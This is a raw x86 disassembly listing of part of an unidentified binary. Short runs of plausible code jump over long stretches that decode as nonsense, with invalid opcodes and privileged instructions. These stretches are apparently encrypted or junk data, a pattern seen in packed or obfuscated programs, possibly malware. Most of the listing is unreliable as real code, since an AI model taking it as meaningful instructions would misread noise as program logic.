  428661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428662:	jnp    0x42865f
  428664:	xchg   esi,eax
  428665:	cmp    esp,0x376b8d3d
  42866b:	add    edi,ecx
  42866d:	inc    ebp
  42866e:	mov    cl,0xd9
  428670:	xor    ebp,esp
  428672:	cld    
  428673:	jno    0x4286a0
  428675:	mov    eax,0x20ba
  42867a:	cmp    DWORD PTR ds:0x433554,0x0
  428681:	jb     0x4286a8
  428687:	xor    DWORD PTR ds:0x433604,ecx
  42868d:	jmp    0x4286a8
  428692:	push   DWORD PTR [ebp-0x14]
  428695:	push   0x5e9c
  42869a:	push   0x6a94
  42869f:	push   DWORD PTR [ebp-0x28]
  4286a2:	call   DWORD PTR ds:0x43c7fc
  4286a8:	mov    WORD PTR [esp+0x3c],ax
  4286ad:	mov    eax,0x1336
  4286b2:	mov    WORD PTR [esp+0x40],ax
  4286b7:	movzx  eax,WORD PTR [esp+0x40]
  4286bc:	movzx  ecx,WORD PTR [esp+0x3c]
  4286c1:	jmp    0x4287a1
  4286c6:	pusha  
  4286c7:	xchg   esp,eax
  4286c8:	inc    edx
  4286c9:	and    al,0xf6
  4286cb:	mul    BYTE PTR [esi-0x2c]
  4286ce:	pop    esp
  4286cf:	xor    al,BYTE PTR [ebp+0x2539b4bf]
  4286d5:	(bad)  
  4286d6:	out    dx,eax
  4286d7:	fld    QWORD PTR [ecx]
  4286d9:	add    bl,al
  4286db:	add    BYTE PTR [eax],al
  4286dd:	add    BYTE PTR [ebx+0x68],al
  4286e0:	or     BYTE PTR [eax],dl
  4286e2:	in     eax,dx
  4286e3:	or     dl,BYTE PTR [esi-0x73e8f1a2]
  4286e9:	sub    DWORD PTR [ebx+0x2a],ebp
  4286ec:	ficom  DWORD PTR [esi+0x70]
  4286ef:	test   DWORD PTR [eax-0x145f75f5],edx
  4286f5:	push   ds
  4286f6:	nop
  4286f7:	push   edx
  4286f8:	lds    ecx,FWORD PTR [ebp+edi*1-0x20]
  4286fc:	jmp    0x6bb51c4b
  428701:	or     cl,al
  428703:	mov    edx,DWORD PTR [esi]
  428705:	and    eax,0xbfab44e5
  42870a:	pusha  
  42870b:	ds cwde 
  42870d:	lods   al,BYTE PTR fs:[esi]
  42870f:	jno    0x428769
  428711:	jb     0x42873b
  428713:	bound  edi,QWORD PTR [edi-0x20]
  428716:	fsub   QWORD PTR [edi-0xd]
  428719:	repz int 0x6e
  42871c:	or     DWORD PTR [ebp+0x402c7625],esi
  428722:	jnp    0x428768
  428724:	xchg   ecx,eax
  428726:	out    0x39,al
  428728:	lea    ecx,[esi-0x50]
  42872b:	mov    bh,0xff
  42872d:	int3   
  42872e:	or     DWORD PTR [ebx],ebp
  428730:	mov    ah,0x11
  428732:	adc    DWORD PTR [edi-0x56e80215],eax
  428738:	(bad)  
  428739:	clc    
  42873a:	push   es
  42873b:	jmp    0x42873d
  42873d:	mov    bh,0xba
  42873f:	imul   ecx,DWORD PTR [esi+ebx*2],0x42
  428743:	adc    BYTE PTR [eax],0x22
  428746:	in     al,dx
  428747:	jge    0x4286d4
  428749:	inc    ecx
  42874a:	iret   
  42874b:	add    eax,0x6c7dff0a
  428750:	in     eax,dx
  428751:	mov    edx,0xbc1da6b0
  428756:	or     ebp,eax
  428758:	icebp  
  428759:	cmp    ebx,DWORD PTR gs:[ebx-0x79]
  42875d:	mov    al,ds:0xc94c11e5
  428762:	hlt    
  428763:	jg     0x428709
  428765:	lock mov ds:0x9ba1e9e4,al
  42876b:	jo     0x42878e
  42876d:	aad    0x7c
  42876f:	or     BYTE PTR [ecx],cl
  428771:	repz out 0x5b,eax
  428774:	aad    0xce
  428776:	adc    eax,0x62c3967f
  42877b:	call   0x4bd2:0x5f5fdfec
  428782:	mov    dh,0x66
  428784:	pop    es
  428785:	out    0xd0,eax
  428787:	sbb    DWORD PTR [ebp-0x5e0ac490],edi
  42878d:	and    al,BYTE PTR fs:[eax+ecx*2+0x7d]
  428792:	mov    edx,0xfc061bd3
  428797:	sub    BYTE PTR [edi],bh
  428799:	sub    al,0xd4
  42879b:	(bad)  
  42879c:	xor    BYTE PTR [ebx+0x33282deb],ch
  4287a2:	rol    DWORD PTR [ecx+0x6375e9],0x0
  4287a9:	movzx  ecx,WORD PTR [esp+0x30]
  4287ae:	adc    edx,0x4eb5
  4287b4:	jmp    0x428894
  4287b9:	mul    BYTE PTR [esi]
  4287bb:	dec    edi
  4287bc:	fcmovnu st,st(7)
  4287be:	sti    
  4287bf:	imul   BYTE PTR [edi]
  4287c1:	fs push ss
  4287c3:	dec    esi
  4287c4:	imul   eax,eax,0xb2956adf
  4287ca:	fiadd  WORD PTR [ecx]
  4287cc:	add    bl,al
  4287ce:	add    BYTE PTR [eax],al
  4287d0:	add    BYTE PTR [ebx],bh
  4287d2:	dec    ebp
  4287d3:	dec    ecx
  4287d4:	xor    eax,0x2015ffb2
  4287d9:	mov    ecx,0x2536a803
  4287de:	lahf   
  4287df:	popa   
  4287e0:	sub    BYTE PTR ds:0xe5024b86,0x60
  4287e7:	lea    ecx,[ecx-0x39]
  4287ea:	in     eax,0x86
  4287ec:	in     eax,dx
  4287ed:	xchg   bp,ax
  4287ef:	adc    ch,cl
  4287f1:	cs enter 0x334e,0x25
  4287f6:	dec    esi
  4287f7:	jp     0x428839
  4287f9:	adc    edx,ebp
  4287fb:	rcr    BYTE PTR [edx-0x45c83b65],0x3a
  428802:	int    0xbf
  428804:	aas    
  428805:	pop    es
  428806:	mov    edx,0x22bf5e55
  42880b:	jbe    0x428810
  42880d:	and    dl,BYTE PTR [esi-0x5a]
  428810:	gs push ss
  428812:	fild   DWORD PTR [edi-0x2a]
  428815:	add    eax,0x3abb3728
  42881a:	sub    edi,DWORD PTR [edi+eax*8-0x40a57bff]
  428821:	pop    es
  428822:	push   cs
  428823:	xor    eax,0x684dc5af
  428828:	stc    
  428829:	call   0xeb1c:0x8193139b
  428830:	stc    
  428831:	xor    eax,0x7045fccf
  428836:	(bad)  
  428837:	mov    dh,BYTE PTR [eax-0x6c]
  42883a:	mov    ebx,0x8a5e5914
  42883f:	adc    bh,al
  428841:	fdiv   DWORD PTR [ecx-0xb04f977]
  428847:	xchg   esi,eax
  428848:	test   DWORD PTR [ebp+0x5b60d3e3],edi
  42884e:	shr    BYTE PTR [edx+0x27],1
  428851:	or     edi,DWORD PTR [edi]
  428853:	in     eax,0x3e
  428855:	cli    
  428856:	rcr    DWORD PTR [esi],0x59
  428859:	mov    DWORD PTR [eax],0xc496cd71
  42885f:	mov    ah,0x17
  428861:	js     0x42881a
  428863:	jp     0x42888a
  428865:	pop    esp
  428866:	mov    ds:0xad9d2216,al
  42886b:	out    dx,al
  42886c:	jbe    0x428846
  42886e:	push   esp
  42886f:	inc    ebp
  428870:	dec    esi
  428871:	sbb    DWORD PTR [edx],esi
  428873:	adc    eax,0x14af0ab8
  428878:	mov    ebp,0x2ff1520
  42887d:	adc    DWORD PTR [ebx],edi
  42887f:	cmp    dh,BYTE PTR [ecx]
  428881:	clc    
  428882:	inc    esi
  428883:	mov    tr4,edi
  428886:	dec    ecx
  428887:	sahf   
  428888:	mov    ah,0x2a
  42888a:	(bad)  
  42888b:	repz ret 0x5c61
  42888f:	gs repz push 0x1e
  428893:	push   ebx
  428894:	imul   eax,eax,0x5cd1
  42889a:	movzx  edx,WORD PTR [esp+0x28]
  42889f:	or     DWORD PTR ds:0x433668,0x43364c
  4288a9:	or     ecx,edx
  4288ab:	or     eax,ecx
  4288ad:	add    DWORD PTR ds:0x433630,0x44aa
  4288b7:	jmp    0x428997
  4288bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4288bd:	inc    ecx
  4288be:	dec    ebx
  4288bf:	xchg   esi,eax
  4288c0:	out    dx,eax
  4288c1:	sahf   
  4288c2:	push   DWORD PTR [ecx-0x38]
  4288c5:	sub    bh,BYTE PTR [edi+0x33]
  4288c8:	les    ebp,FWORD PTR ds:0xdf7592c2
  4288ce:	add    DWORD PTR [eax],eax
  4288d0:	ret    
  4288d1:	add    BYTE PTR [eax],al
  4288d3:	add    bh,bh
  4288d5:	leave  
  4288d6:	sub    dl,BYTE PTR [ebx+edi*1]
  4288d9:	enter  0xb5b1,0x4
  4288dd:	into   
  4288de:	lahf   
  4288df:	push   ebx
  4288e0:	inc    edx
  4288e1:	add    eax,0xbace5577
  4288e6:	pop    esp
  4288e7:	in     al,dx
  4288e8:	cld    
  4288e9:	in     eax,dx
  4288ea:	jb     0x428962
  4288ec:	and    BYTE PTR [eax-0x63],ah
  4288ef:	into   
  4288f0:	xchg   edx,eax
  4288f1:	std    
  4288f2:	sub    dl,BYTE PTR [ecx-0x74de0f1b]
  4288f8:	push   es
  4288f9:	inc    edx
  4288fa:	ret    0x6e96
  4288fd:	addr16 iret 
  4288ff:	mov    eax,ds:0x289fa8a2
  428904:	es adc al,0x77
  428907:	or     BYTE PTR [ebx+esi*1],al
  42890a:	push   0xd3a4cddd
  42890f:	shr    dh,cl
  428911:	mov    ebp,0x56288bcb
  428916:	mov    ch,0xe3
  428918:	test   eax,0x68d0075b
  42891d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42891f:	inc    edi
  428920:	fbld   TBYTE PTR [esi+0x12]
  428923:	adc    dl,BYTE PTR [eax-0x3]
  428926:	mov    ebp,0x795699c6
  42892b:	dec    edi
  42892c:	test   BYTE PTR [eax],0x1
  42892f:	inc    edi
  428930:	xchg   ebx,eax
  428931:	or     al,0x47
  428933:	mov    ch,0x2
  428935:	xchg   ebp,eax
  428936:	dec    ecx
  428937:	repz inc eax
  428939:	mov    esp,0xd1287273
  42893e:	pop    esp
  42893f:	and    DWORD PTR [edx+0x3a],eax
  428942:	mov    dh,0x37
  428944:	sub    eax,0x1ceb1827
  428949:	gs jecxz 0x4288e2
  42894c:	or     DWORD PTR ds:[ebp+0x709478c6],ecx
  428953:	imul   edx,ecx,0x3f
  428956:	adc    ebp,ebx
  428958:	iret   
  428959:	sbb    ecx,edx
  42895b:	mov    ecx,DWORD PTR [esi]
  42895d:	sti    
  42895e:	shl    DWORD PTR [edx+0x5a],0xb7
  428962:	push   ebp
  428963:	outs   dx,DWORD PTR ds:[esi]
  428964:	pop    es
  428965:	jl     0x428910
  428967:	cmp    ch,BYTE PTR [ebx+0x66]
  42896a:	xor    dh,bl
  42896c:	retf   
  42896d:	xor    al,0x27
  42896f:	adc    BYTE PTR [edx+0x2cf0930d],ch
  428975:	jns    0x428928
  428977:	inc    ecx
  428978:	enter  0x8249,0x95
  42897c:	das    
  42897d:	inc    ebx
  42897e:	jl     0x42892b
  428980:	cmp    BYTE PTR [edx+0x61],al
  428983:	jae    0x428915
  428985:	inc    ebx
  428986:	icebp  
  428987:	or     edi,ebp
  428989:	ror    DWORD PTR [esi+0x6d],0x20
  42898d:	add    eax,0x51a09277
  428992:	cmp    ebx,DWORD PTR [ebx-0x5d]
  428995:	sbb    esp,DWORD PTR gs:[esi-0x77]
  428999:	inc    esp
  42899a:	and    al,0x20
  42899c:	mov    eax,0x6429
  4289a1:	and    DWORD PTR ds:0x4335bc,0x1478
  4289ab:	mov    WORD PTR [esp+0x40],ax
  4289b0:	mov    eax,0x77e
  4289b5:	adc    DWORD PTR ds:0x433640,0x2e52
  4289bf:	mov    WORD PTR [esp+0x3c],ax
  4289c4:	mov    eax,ds:0x433644
  4289c9:	adc    eax,DWORD PTR ds:0x4335f0
  4289cf:	mov    ds:0x433644,eax
  4289d4:	mov    eax,0x69d8
  4289d9:	mov    WORD PTR [esp+0x30],ax
  4289de:	xor    eax,eax
  4289e0:	add    eax,DWORD PTR ds:0x4336a4
  4289e6:	mov    eax,DWORD PTR [eax]
  4289e8:	xor    DWORD PTR ds:0x433558,eax
  4289ee:	mov    eax,0x3e02
  4289f3:	add    DWORD PTR ds:0x4335bc,0x433568
  4289fd:	mov    WORD PTR [esp+0x28],ax
  428a02:	dec    DWORD PTR ds:0x4335b0
  428a08:	mov    ax,WORD PTR [esp+0x28]
  428a0d:	xor    DWORD PTR ds:0x433588,0x1785
  428a17:	mov    cx,WORD PTR [esp+0x30]
  428a1c:	movzx  ecx,cx
  428a1f:	adc    DWORD PTR ds:0x433638,0x4335c4
  428a29:	jmp    0x428b09
  428a2e:	cmp    ch,dl
  428a30:	sbb    esp,edi
  428a32:	fcomi  st,st(7)
  428a34:	(bad)  
  428a35:	(bad)  
  428a36:	in     al,dx
  428a37:	test   al,0x6e
  428a39:	pop    edi
  428a3a:	aaa    
  428a3b:	cmp    al,0x41
  428a3d:	pop    edi
  428a3e:	cmp    al,ah
  428a40:	add    DWORD PTR [eax],eax
  428a42:	ret    
  428a43:	add    BYTE PTR [eax],al
  428a45:	add    BYTE PTR [ebp+0x52],ch
  428a48:	push   cs
  428a49:	std    
  428a4a:	cmp    eax,0xdabff8e9
  428a4f:	fld    QWORD PTR [esi-0x26]
  428a52:	arpl   WORD PTR [edi-0x11955520],sp
  428a58:	cld    
  428a59:	cmc    
  428a5a:	sub    eax,0xfa58ecd0
  428a5f:	xchg   ebx,eax
  428a60:	mov    ecx,0x887017b
  428a65:	popf   
  428a66:	aas    
  428a67:	or     eax,0xe6d786d9
  428a6c:	mov    esp,0xa45b2c5a
  428a71:	and    ah,BYTE PTR [ebp+0x1b13817a]
  428a77:	test   DWORD PTR [edi-0x205e7443],0x163141c9
  428a81:	add    BYTE PTR ds:0x294e66b4,bl
  428a87:	pop    ss
  428a88:	xchg   BYTE PTR [ebx],cl
  428a8a:	add    bh,0xb7
  428a8d:	mov    ch,0xb
  428a8f:	mov    ecx,0xd2ed7021
  428a94:	(bad)  
  428a95:	idiv   al
  428a97:	cmc    
  428a98:	xchg   ebp,eax
  428a99:	inc    edi
  428a9a:	outs   dx,DWORD PTR ds:[esi]
  428a9b:	in     al,0x57
  428a9d:	fstp   QWORD PTR [edi+eiz*4+0x49]
  428aa1:	inc    esi
  428aa2:	cmc    
  428aa3:	daa    
  428aa4:	pop    edx
  428aa5:	mov    ds:0xdc2f5fab,eax
  428aaa:	(bad)  
  428aab:	cmp    ch,dl
  428aad:	push   0x95c88652
  428ab2:	icebp  
  428ab3:	mov    al,0xd3
  428ab5:	cmp    BYTE PTR [edi],bh
  428ab7:	mov    ebx,DWORD PTR [eax-0x23216578]
  428abd:	or     eax,0xde418397
  428ac2:	lock dec eax
  428ac4:	push   esi
  428ac5:	inc    edx
  428ac6:	or     DWORD PTR [edx],edi
  428ac8:	cmp    al,BYTE PTR [ebp-0xd150436]
  428ace:	cmp    DWORD PTR [ebp-0x7e],eax
  428ad1:	int    0xcc
  428ad3:	mov    ch,0xc4
  428ad5:	aas    
  428ad6:	in     eax,0xcc
  428ad8:	outs   dx,DWORD PTR ds:[esi]
  428ad9:	cmp    ch,BYTE PTR [edx+0x21]
  428adc:	outs   dx,BYTE PTR ds:[esi]
  428add:	mov    ecx,0x39ba486
  428ae2:	call   0xc8c9:0x58a1a4d0
  428ae9:	jg     0x428b0c
  428aeb:	mov    edi,0x5ba1fbbf
  428af0:	jle    0x428a8b
  428af2:	xchg   DWORD PTR [ecx],ebx
  428af4:	fwait
  428af5:	mov    ch,0x9d
  428af7:	shr    BYTE PTR [esi+edi*1],0x13
  428afb:	cld    
  428afc:	or     eax,0x9fa190e4
  428b01:	js     0x428b39
  428b03:	into   
  428b04:	cmp    eax,DWORD PTR [ebx+0xfa77192]
  428b0a:	mov    bh,0xc0
  428b0c:	and    eax,ecx
  428b0e:	mov    cx,WORD PTR [esp+0x3c]
  428b13:	jmp    0x428bf3
  428b18:	aas    
  428b19:	or     eax,DWORD PTR [ebx-0x407548f6]
  428b1f:	aas    
  428b20:	mov    bh,0xf6
  428b22:	ins    DWORD PTR es:[edi],dx
  428b23:	int    0x9f
  428b25:	clc    
  428b26:	push   eax
  428b27:	jo     0x428b24
  428b29:	loopne 0x428b2c
  428b2b:	add    bl,al
  428b2d:	add    BYTE PTR [eax],al
  428b2f:	add    ah,ah
  428b31:	cmp    ch,BYTE PTR [ebp-0x33975f5b]
  428b37:	mov    edi,0x6f54bae7
  428b3c:	loope  0x428b99
  428b3e:	jne    0x428b29
  428b40:	out    dx,al
  428b41:	js     0x428ac5
  428b43:	ficomp WORD PTR [ebp+0x7a92ae5e]
  428b49:	jno    0x428b7a
  428b4b:	ins    BYTE PTR es:[edi],dx
  428b4c:	xchg   esp,eax
  428b4d:	sbb    eax,0x59daaf07
  428b52:	jbe    0x428b5a
  428b54:	rcl    ecx,0x65
  428b57:	loopne 0x428b49
  428b59:	in     al,dx
  428b5a:	cdq    
  428b5b:	fild   WORD PTR ds:0xe8f1f95a
  428b61:	cmp    bh,ch
  428b63:	xchg   esp,eax
  428b64:	dec    ebx
  428b65:	sbb    ebx,ecx
  428b67:	ficomp WORD PTR [esi-0x14]
  428b6a:	out    dx,eax
  428b6b:	shl    BYTE PTR [edi+0x3a],cl
  428b6e:	hlt    
  428b6f:	push   ecx
  428b70:	sub    esp,edx
  428b72:	lock jl 0x428b35
  428b75:	ins    BYTE PTR es:[edi],dx
  428b76:	ret    
  428b77:	not    BYTE PTR [edx-0x35f64f24]
  428b7d:	and    eax,0x9798d764
  428b82:	dec    edx
  428b83:	call   0xc3c59f5f
  428b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428b89:	(bad)  
  428b8a:	imul   edx,DWORD PTR [ebp+eax*8+0x5f],0xfffffffd
  428b8f:	daa    
  428b90:	fs aad 0x5d
  428b93:	call   0x3222:0x53bf8f0f
  428b9a:	or     ebp,edx
  428b9c:	xchg   edi,eax
  428b9d:	jae    0x428b38
  428b9f:	add    BYTE PTR [ecx+0x5c532ea9],ah
  428ba5:	stos   DWORD PTR es:[edi],eax
  428ba6:	dec    edi
  428ba7:	into   
  428ba8:	gs xchg cl,ah
  428bab:	lahf   
  428bac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428bad:	add    ah,BYTE PTR [ebp+0x53]
  428bb0:	(bad)  
  428bb1:	mov    esp,0x2d6eb3eb
  428bb6:	nop    DWORD PTR [edi-0x67dc7933]
  428bbd:	nop
  428bbe:	scas   al,BYTE PTR es:[edi]
  428bbf:	rcr    eax,0xe0
  428bc2:	jmp    0x3bb4de3f
  428bc7:	(bad)  
  428bc8:	mov    ebp,0xb3d184c0
  428bcd:	iret   
  428bce:	inc    ebp
  428bcf:	xor    ecx,ecx
  428bd1:	stos   BYTE PTR es:[edi],al
  428bd2:	dec    eax
  428bd3:	xchg   ebp,eax
  428bd4:	rol    BYTE PTR [edi+ecx*2-0x649549ce],cl
  428bdb:	or     dh,BYTE PTR [ebp+0x4db61ebf]
  428be1:	in     eax,0x9e
  428be3:	jmp    0x2cf8:0xca164318
  428bea:	dec    ebx
  428beb:	cmp    ch,BYTE PTR [ecx]
  428bed:	xchg   edi,eax
  428bee:	fwait
  428bef:	or     eax,0xfd3a4b6
  428bf4:	mov    bh,0xc9
  428bf6:	jmp    0x428cd6
  428bfb:	daa    
  428bfc:	bound  ebx,QWORD PTR [edi+edx*8]
  428bff:	pop    ebp
  428c00:	(bad)  
  428c01:	out    dx,eax
  428c02:	repnz arpl WORD PTR [eax-0x39d33258],di
  428c09:	ror    ch,cl
  428c0b:	mov    esi,0xc30001e1
  428c10:	add    BYTE PTR [eax],al
  428c12:	add    BYTE PTR [ebx],bl
  428c14:	inc    edi
  428c15:	leave  
  428c16:	dec    ebp
  428c17:	add    BYTE PTR [ebp-0x5e8aab5c],dl
  428c1d:	and    al,0xab
  428c1f:	xor    edi,DWORD PTR [edi+0x5c0f4757]
  428c25:	shr    ebp,0x6
  428c28:	popa   
  428c29:	rcl    ah,0x2
  428c2c:	xor    eax,0xfe00e6ae
  428c31:	inc    ebp
  428c32:	and    DWORD PTR ds:0xc14019ab,0xed2c52b5
  428c3c:	sub    BYTE PTR [esi+edx*1],al
  428c3f:	enter  0x1b2d,0xe6
  428c43:	mov    edi,0xe69738de
  428c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c49:	pop    edi
  428c4a:	adc    al,0x70
  428c4c:	int3   
  428c4d:	dec    esi
  428c4e:	xchg   ebp,eax
  428c4f:	add    ebp,esi
  428c51:	cmp    ecx,DWORD PTR [ebx-0xc]
  428c54:	mov    dh,0x63
  428c56:	inc    ebx
  428c57:	fnstcw WORD PTR [ebx]
  428c59:	call   0x3225:0xadc9be76
  428c60:	(bad)  
  428c61:	(bad)  
  428c63:	push   ds
  428c64:	mov    dl,0x13
  428c66:	aas    
  428c67:	les    ebx,FWORD PTR [eax]
  428c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c6a:	mov    ebp,0x5c9323fd
  428c6f:	sub    esi,esp
  428c71:	jle    0x428bfa
  428c73:	dec    esi
  428c74:	mov    al,0x78
  428c76:	or     DWORD PTR [ecx+0x2a],edx
  428c79:	clc    
  428c7a:	jmp    0x428ccd
  428c7c:	(bad)  
  428c7d:	nop
  428c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428c7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428c80:	add    al,0xf
  428c82:	pop    esp
  428c83:	hlt    
  428c84:	push   esi
  428c85:	fild   DWORD PTR [ebp+0xe68367d]
  428c8b:	jb     0x428cac
  428c8d:	outs   dx,BYTE PTR ds:[esi]
  428c8e:	adc    ah,dl
  428c90:	ret    
  428c91:	lods   al,BYTE PTR ds:[esi]
  428c92:	jle    0x428d08
  428c94:	data16 jl 0x428c99
  428c97:	add    edx,ebp
  428c99:	pop    ss
  428c9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428c9b:	mov    al,0xa6
  428c9d:	or     eax,0xd58a56ad
  428ca2:	fs leave 
  428ca4:	dec    ebx
  428ca5:	and    ebx,0x4c
  428ca8:	pop    ds
  428ca9:	(bad)  
  428caa:	jge    0x428c9c
  428cac:	popf   
  428cad:	pop    ss
  428cae:	imul   ebp,DWORD PTR [edi-0x7b],0x38
  428cb2:	nop
  428cb3:	or     DWORD PTR [esi-0x10],esi
  428cb6:	(bad)  
  428cb8:	stos   DWORD PTR es:[edi],eax
  428cb9:	or     bl,BYTE PTR [ebx+eax*1-0x8]
  428cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428cbe:	stos   BYTE PTR es:[edi],al
  428cbf:	add    ecx,eax
  428cc1:	jnp    0x428cca
  428cc3:	or     esi,esi
  428cc5:	test   al,0x94
  428cc7:	mov    bh,0x6
  428cc9:	inc    edi
  428cca:	push   ebp
  428ccb:	pop    ecx
  428ccc:	imul   edi,DWORD PTR [ecx+0x48],0xffffffc0
  428cd0:	or     BYTE PTR [ebx-0x4ec06681],0xf
  428cd7:	scas   eax,DWORD PTR es:[edi]
  428cd8:	rol    DWORD PTR [ecx+0x4335700d],0x0
  428cdf:	test   BYTE PTR ds:0x8b660043,dh
  428ce5:	dec    esp
  428ce6:	and    al,0x40
  428ce8:	imul   eax,eax,0x1d7f
  428cee:	jmp    0x428dce
  428cf3:	lea    esp,[ebx-0x2f]
  428cf6:	call   0x6bba:0x77cfbaff
  428cfd:	xlat   BYTE PTR ds:[ebx]
  428cfe:	aas    
  428cff:	ret    0x8563
  428d02:	fiadd  WORD PTR [ecx-0x3cfffe1e]
  428d08:	add    BYTE PTR [eax],al
  428d0a:	add    BYTE PTR [esi],dl
  428d0c:	arpl   bx,cx
  428d0e:	enter  0x6c28,0xf3
  428d12:	pop    edx
  428d13:	lods   eax,DWORD PTR ds:[esi]
  428d14:	sbb    al,0x32
  428d16:	mov    dl,0x66
  428d18:	loope  0x428d7e
  428d1a:	xchg   edi,eax
  428d1b:	ja     0x428cfe
  428d1d:	adc    al,0xcd
  428d1f:	stos   BYTE PTR es:[edi],al
  428d20:	add    bl,BYTE PTR [eax+0x36]
  428d23:	and    esi,DWORD PTR [ebx+0x59ad4925]
  428d29:	mov    ds:0xb318acd1,al
  428d2e:	sbb    DWORD PTR [esi-0x462717cd],ebp
  428d34:	dec    ebx
  428d35:	dec    eax
  428d36:	jge    0x428cc8
  428d38:	popf   
  428d39:	pop    ds
  428d3a:	jnp    0x428db9
  428d3c:	sub    edx,DWORD PTR [eax+ebx*2]
  428d3f:	sti    
  428d40:	pop    edi
  428d41:	push   ds
  428d42:	jno    0x428cfe
  428d44:	sub    dl,BYTE PTR [ecx]
  428d46:	push   eax
  428d47:	es push ebp
  428d49:	cmc    
  428d4a:	mov    esp,0xf1ba8ef7
  428d4f:	dec    edi
  428d50:	lahf   
  428d51:	xchg   edx,eax
  428d52:	mov    ds:0xdba42448,al
  428d57:	dec    esp
  428d58:	rol    esi,cl
  428d5a:	xor    BYTE PTR [edx+0x69d7faf7],ah
  428d60:	call   0xc4e0:0x2940b42e
  428d67:	and    DWORD PTR [esi],ebx
  428d69:	and    cl,BYTE PTR [edx+0x6b]
  428d6c:	daa    
  428d6d:	inc    edx
  428d6e:	cs ret 
  428d70:	sub    cl,BYTE PTR [ebx+eiz*4]
  428d73:	adc    al,BYTE PTR [ebp-0x7b625f9a]
  428d79:	sub    dl,dh
  428d7b:	scas   eax,DWORD PTR es:[edi]
  428d7c:	mov    esp,0x57b9cf64
  428d81:	sbb    ah,cl
  428d83:	sub    DWORD PTR ds:0x7e4a45b9,esp
  428d89:	outs   dx,DWORD PTR ds:[esi]
  428d8a:	(bad)  
  428d8b:	pop    esi
  428d8c:	jmp    0x65f10b82
  428d91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428d92:	and    ah,bl
  428d94:	test   DWORD PTR [edi-0x25],ecx
  428d97:	cli    
  428d98:	ss pop esp
  428d9a:	cwde   
  428d9b:	cdq    
  428d9c:	clc    
  428d9d:	rcr    edi,cl
  428d9f:	xchg   edx,eax
  428da0:	int    0x2a
  428da2:	sbb    dl,BYTE PTR [ebx+0x48]
  428da5:	mov    dh,0x3d
  428da7:	push   es
  428da8:	mov    dh,0xa6
  428daa:	xchg   ebp,eax
  428dab:	mov    al,0x2b
  428dad:	mov    ebp,0xf2c9b689
  428db2:	push   esp
  428db3:	scas   al,BYTE PTR es:[edi]
  428db4:	rcr    ch,1
  428db6:	mov    ah,BYTE PTR [ebx-0x52]
  428db9:	mov    ah,0x4
  428dbb:	xor    edi,DWORD PTR [eax+esi*8+0x9de8878]
  428dc2:	xor    DWORD PTR [ecx],ebx
  428dc4:	aad    0x8
  428dc6:	mov    ds:0x3aec946a,al
  428dcb:	pinsrw mm5,ebx,0xf
  428dcf:	mov    bh,0xc9
  428dd1:	mov    DWORD PTR ds:0x4335ec,0x6a8
  428ddb:	jmp    0x428ebb
  428de0:	push   eax
  428de1:	mov    edi,0xf5ff715b
  428de6:	jp     0x428da7
  428de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428de9:	rcl    BYTE PTR [esi+0x7a],0x83
  428ded:	daa    
  428dee:	retf   0x4495
  428df1:	jecxz  0x428df4
  428df3:	add    bl,al
  428df5:	add    BYTE PTR [eax],al
  428df7:	add    BYTE PTR [ecx+0x33],bh
  428dfa:	(bad)  
  428dfb:	jne    0x428ddd
  428dfd:	pop    edi
  428dfe:	int3   
  428dff:	and    ecx,DWORD PTR [ebx+0x365fb562]
  428e05:	mov    BYTE PTR [esi-0x3b],ah
  428e08:	jmp    0x428e71
  428e0a:	jecxz  0x428df0
  428e0c:	(bad)  
  428e0d:	add    edx,DWORD PTR [edi-0x4d]
  428e10:	leave  
  428e11:	stos   DWORD PTR es:[edi],eax
  428e12:	sub    BYTE PTR [edi-0x7cf02605],bh
  428e18:	adc    bh,dh
  428e1a:	or     DWORD PTR [edi+0x3d6523f3],esp
  428e20:	les    edx,FWORD PTR [eax]
  428e22:	movsx  esi,WORD PTR [ebp+esi*8-0x303e11c3]
  428e2a:	dec    ebp
  428e2b:	rol    BYTE PTR [eax],0xd4
  428e2e:	dec    edi
  428e2f:	addr16 cmp ch,bh
  428e32:	adc    eax,0xb216de26
  428e37:	adc    esi,DWORD PTR [ebx]
  428e39:	pop    es
  428e3a:	fisub  WORD PTR [edx+0x1a]
  428e3d:	pop    esp
  428e3e:	jns    0x428de9
  428e40:	enter  0x1f54,0x69
  428e44:	pop    ebx
  428e45:	adc    bh,BYTE PTR [edi+0x30]
  428e48:	mov    bh,0x6b
  428e4a:	les    esp,FWORD PTR [ebp+0x27ffa474]
  428e50:	pop    ds
  428e51:	add    ah,BYTE PTR [edi+0x50bd6867]
  428e57:	pop    ds
  428e58:	push   edx
  428e59:	adc    BYTE PTR [edx-0x5362067b],al
  428e5f:	pop    es
  428e60:	xchg   DWORD PTR [esi],edx
  428e62:	jle    0x428e70
  428e64:	adc    eax,0xc31945eb
  428e69:	arpl   WORD PTR [eax+0x63b9f19c],di
  428e6f:	jb     0x428ec9
  428e71:	sub    al,0xa1
  428e73:	or     eax,0x80c64dbb
  428e78:	popf   
  428e79:	dec    BYTE PTR [ecx+0x75b24d13]
  428e7f:	mov    ah,ah
  428e81:	sti    
  428e82:	mov    BYTE PTR [esi],al
  428e84:	jns    0x428ee3
  428e86:	idiv   BYTE PTR [esi]
  428e88:	and    BYTE PTR [edi+0x4a590305],dh
  428e8e:	cmp    eax,0x282f9f14
  428e93:	sbb    cl,BYTE PTR [edi+0x2]
  428e96:	pop    es
  428e97:	xlat   BYTE PTR ds:[ebx]
  428e98:	ds mov al,0xa9
  428e9b:	cwde   
  428e9c:	mov    dh,0xe6
  428e9e:	(bad)  
  428e9f:	fst    QWORD PTR [ebx]
  428ea1:	imul   esi,DWORD PTR [eax+edi*2+0x4ebfe9cc],0xfffffff7
  428ea9:	(bad)  
  428eaa:	pop    ebx
  428eab:	jmp    0x428ec8
  428ead:	sahf   
